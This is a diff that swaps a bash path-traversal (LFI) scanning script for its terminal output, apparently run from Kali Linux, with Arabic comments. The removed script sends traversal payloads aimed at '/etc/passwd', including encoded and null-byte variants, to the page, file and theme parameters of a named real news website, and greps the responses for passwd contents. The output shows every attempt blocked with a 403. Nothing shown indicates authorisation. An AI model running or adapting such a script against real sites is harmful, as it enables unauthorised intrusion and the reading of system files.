@@ -1,58 +1,19 @@
-#!/bin/bash
+./sh.sh       
+[*] بدء محاكاة اختبار حقن وتخطي المسارات (LFI Test)...
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /search-custom?page=../../../../../../../../etc/passwd
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /search-custom?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /search-custom?page=../../../../../../../../etc/passwd%00
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /search-custom?page=/etc/passwd
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /?file=../../../../../../../../etc/passwd
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /?file=../../../../../../../../etc/passwd%00
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /?file=/etc/passwd
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /?theme=../../../../../../../../etc/passwd
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /?theme=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /?theme=../../../../../../../../etc/passwd%00
+[+] الخادم قام بحظر المحاولة بشكل آمن (403): /?theme=/etc/passwd
 
-# ألوان لتنظيم المخرجات
-GREEN='\033[0;32m'
-RED='\033[0;31m'
-BLUE='\033[0;34m'
-YELLOW='\033[0;33m'
-NC='\033[0m'
-
-TARGET="https://www.syria.tv"
-
-echo -e "${BLUE}[*] بدء محاكاة اختبار حقن وتخطي المسارات (LFI Test)...${NC}"
-
-# مصفوفة تحتوي على أنماط الحقن الشائعة لمحاولة قراءة ملفات النظام الأساسية
-PAYLOADS=(
-    "../../../../../../../../etc/passwd"
-    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
-    "../../../../../../../../etc/passwd%00"
-    "/etc/passwd"
-)
-
-# المعلمات أو المسارات التي قد تتفاعل مع الملفات (يتم اختبارها بشكل افتراضي)
-TEST_PATHS=(
-    "/search-custom?page="
-    "/?file="
-    "/?theme="
-)
-
-for PATH_BASE in "${TEST_PATHS[@]}"
-do
-    for PAYLOAD in "${PAYLOADS[@]}"
-    do
-        # دمج الرابط مع نمط الحقن
-        URL="${TARGET}${PATH_BASE}${PAYLOAD}"
-        
-        # إرسال الطلب وجلب كود الحالة وحجم الاستجابة
-        RESPONSE=$(curl -s -o /dev/null -w "%{http_code};%{size_download}" "$URL")
-        STATUS=$(echo $RESPONSE | cut -d';' -f1)
-        SIZE=$(echo $RESPONSE | cut -d';' -f2)
-        
-        # تحليل الاستجابة بناءً على السلوك
-        if [ "$STATUS" -eq 200 ]; then
-            # إذا كانت الحالة 200، نقوم بالتحقق من وجود علامات تدل على نجاح الحقن (مثل محتوى نظام Linux)
-            CHECK_CONTENT=$(curl -s "$URL" | grep -E "root:x:|bin/bash" | wc -l)
-            if [ "$CHECK_CONTENT" -gt 0 ]; then
-                echo -e "${RED}[!] تحذير: استجابة إيجابية محتملة (نجاح الحقن) على: $URL (الحجم: $SIZE)${NC}"
-            else
-                echo -e "${YELLOW}[-] الحالة 200 ولكن المحتوى طبيعي (لا يوجد حقن فعلي): ${PATH_BASE}${PAYLOAD}${NC}"
-            fi
-        elif [ "$STATUS" -eq 403 ] || [ "$STATUS" -eq 400 ]; then
-            echo -e "${GREEN}[+] الخادم قام بحظر المحاولة بشكل آمن ($STATUS): ${PATH_BASE}${PAYLOAD}${NC}"
-        else
-            echo -e "${BLUE}[-] استجابة عادية ($STATUS): ${PATH_BASE}${PAYLOAD}${NC}"
-        fi
-    done
-done
-
-echo -e "\n${BLUE}[*] انتهى اختبار محاكاة حقن الملفات.${NC}"
+[*] انتهى اختبار محاكاة حقن الملفات.
+                                                                                
+┌──(venv)─(root㉿kali)-[/home/ghost/dTa]
+└─#                   
